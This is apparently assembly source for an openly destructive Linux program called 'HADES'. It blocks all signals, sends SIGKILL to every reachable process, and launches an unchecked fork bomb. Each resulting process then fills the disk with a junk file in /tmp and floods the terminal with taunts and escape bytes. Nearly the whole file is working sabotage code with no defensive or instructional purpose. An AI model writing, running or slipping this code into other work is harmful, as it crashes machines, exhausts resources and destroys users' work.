; ==============================================================================
; PROJECT: HADES - GLITCH EDITION (The Visual Nightmare)
; ARCHITECTURE: x86_64 Linux
; WARNING: NO SLEEP. NO LIMITS. TOTAL SCREEN CORRUPTION.
; ==============================================================================

section .data
    ; ANSI Escape Sequences
    clear_screen db 0x1B, '[2J', 0x1B, '[H', 0
    hide_cursor  db 0x1B, '[?25l', 0
    
    ; Glitch Template: ESC [ <row> ; <col> H <color> <msg>
    msg1 db 0x1B, '[%d;%dH', 0x1B, '[1;31m', '[!] HADES: VOID CONSUMES YOU ', 0
    msg2 db 0x1B, '[%d;%dH', 0x1B, '[1;33m', '[!] DATA_CORRUPTION_DETECTED ', 0
    msg3 db 0x1B, '[%d;%dH', 0x1B, '[1;35m', '[!] NO_ESCAPE_MORTAL_REMAIN ', 0
    msg4 db 0x1B, '[%d;%dH', 0x1B, '[1;37m', '[!] SYSTEM_ZERO_INITIALIZED ', 0

    taunt_ptrs dq msg1, msg2, msg3, msg4
    taunt_count equ 4

    ; File Destruction
    junk_file db '/tmp/.hades_core_dump', 0
    junk_data db 'HADES_WAS_HERE_SYSTEM_DESTROYED_', 0
    junk_len  equ $ - junk_data

section .bss
    draw_buf resb 128 ; Buffer to build the ANSI string

section .text
    global _start

_start:
    ; --- STEP 1: SIGNAL IMMUNITY ---
    sub rsp, 8
    mov qword [rsp], 0xFFFFFFFFFFFFFFFF
    mov rax, 14         ; sys_rt_sigprocmask
    mov rdi, 0          ; SIG_BLOCK
    mov rsi, rsp
    xor rdx, rdx
    mov r10, 8
    syscall

    ; --- STEP 2: CLEAR & HIDE ---
    mov rax, 1
    mov rdi, 1
    mov rsi, clear_screen
    mov rdx, 7
    syscall
    mov rax, 1
    mov rsi, hide_cursor
    mov rdx, 6
    syscall

    ; --- STEP 3: EVICIT GUI ---
    mov rax, 62         ; sys_kill
    mov rdi, -1
    mov rsi, 9          ; SIGKILL
    syscall

    ; --- STEP 4: NUCLEAR FORK BOMB ---
fork_war:
    mov rax, 57         ; sys_fork
    syscall
    ; Every process (parent & child) enters the destruction loop
    ; No test rax, rax here -> Maximum growth speed

    ; --- STEP 5: DESTRUCTION & GLITCH LOOP ---
    ; Open junk file
    mov rax, 2          ; sys_open
    mov rdi, junk_file
    mov rsi, 65         ; O_CREAT | O_WRONLY
    mov rdx, 0644o
    syscall
    mov r8, rax         ; FD

glitch_loop:
    ; 1. DISK LOCK
    mov rax, 1
    mov rdi, r8
    mov rsi, junk_data
    mov rdx, junk_len
    syscall

    ; 2. SCREEN GLITCH (ANSI Manipulation)
    ; We'll use a simplified version for pure assembly: 
    ; Just print random cursor jumps and taunts
    
    ; Get random row (0-24) and col (0-80) using rdtsc
    rdtsc
    and al, 0x1F        ; Row ~ 0-31
    mov bl, al          ; Store row in bl
    
    rdtsc
    and al, 0x3F        ; Col ~ 0-63
    mov cl, al          ; Store col in cl

    ; Print ANSI "Jump" sequence: ESC [ row ; col f
    ; Simplified: Just print ESC [ <random> ; <random> H
    push rax
    mov byte [rsp], 0x1B ; ESC
    mov byte [rsp+1], '['
    ; Since converting numbers to string in ASM is long, 
    ; we'll just print random raw bytes to corrupt the TTY state.
    
    mov rax, 1
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 2
    syscall
    pop rax

    ; 3. PRINT TAUNT
    rdtsc
    xor rdx, rdx
    mov rcx, taunt_count
    div rcx
    lea rbx, [taunt_ptrs]
    mov rsi, [rbx + rdx*8]
    mov rdx, 40
    mov rax, 1
    mov rdi, 1
    syscall

    ; NO SLEEP - PURE CHAOS
    jmp glitch_loop
